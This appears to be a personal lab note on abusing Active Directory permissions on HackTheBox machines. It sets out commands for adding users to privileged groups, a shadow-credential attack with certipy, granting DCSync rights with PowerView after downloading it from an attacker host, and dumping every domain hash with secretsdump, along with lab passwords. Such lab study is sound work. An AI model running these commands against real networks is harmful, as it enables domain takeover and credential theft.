
We can abuse ALL permissions and there is many methodologies, let's just do the most effective and simple move.

---
## 1. Method AddMember ACL:

Adding current user to the group using "BloodyAD".

```
bloodyad -u p.agila -p prometheusx-303 -d fluffy.htb -H 10.129.19.236 add groupmember 'service accounts' p.agila
```

Performing Shadow Credential Attack (GenericWrite) to an service account and requesting LM Hash.

```
certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p prometheusx-303 -account winrm_svc -dc-ip 10.129.19.236 -dc-host dc01.fluffy.htb
```

---
## 2. Method: Adding our user to the group with net.exe

1. Creating user and putting him into the Group we want to elevate our privileges.

```
net user hacker password /add /domain  
net group “Exchange Windows Permissions” hacker /add
```

2. Adding user to the "Exchange Trusted Subsystem" Group. 

```
PS C:\\Users\\svc-alfresco\\appdata> Add-ADGroupMember -Identity "Exchange Trusted Subsystem" -Members svc-alfresco
```

3. Re-login into user for the group membership to take effect. 

4. Load PowerView and set up [[DCSync]] rights.


```
iwr -iri http://10.10.4.23/PowerView.ps1 -OutFile PowerView.ps1
Import-Module .\PowerView.ps1
```

5. Setting up DCSync rights.

```
Add-DomainObjectAcl -TargetIdentity “DC=htb,DC=local” -PrincipalIdentity hacker -Rights DCSync
```

Since our created user "hacker" got DSync permissions now, we can dump all the hashes of users of the domain remotely.

```
impacket-secretsdump htb.local/hacker:password@10.129.59.98
```

---
## 3. Method: Adding our user to the group with PS

```
Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco;  
$username = "htb\\svc-alfresco";  
$password = "s3rvice";  
$secstr = New-Object -TypeName System.Security.SecureString;  
$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};  
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr;  
Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\\Domain Admins' -Rights DCSync
```

